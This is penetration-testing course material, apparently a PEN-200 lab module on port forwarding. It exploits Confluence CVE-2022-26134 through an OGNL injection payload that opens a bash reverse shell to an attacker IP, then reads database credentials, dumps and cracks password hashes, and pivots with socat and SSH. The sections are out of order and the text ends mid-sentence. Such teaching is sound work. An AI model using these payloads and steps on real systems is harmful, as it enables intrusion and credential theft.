Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
